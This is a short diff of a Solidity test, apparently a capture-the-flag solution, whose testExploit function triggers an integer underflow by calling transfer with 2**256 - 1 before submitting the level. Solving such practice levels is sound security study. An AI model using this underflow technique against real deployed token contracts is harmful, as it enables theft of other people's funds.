@@ -18,8 +18,8 @@ contract TokenTest is Test {
   }
 
   function testExploit() public {
+    // integer underflow
     challenge.transfer(msg.sender, 2**256 - 1);
-
     utils.submitLevelInstance(challengeAddress);
   }
 }
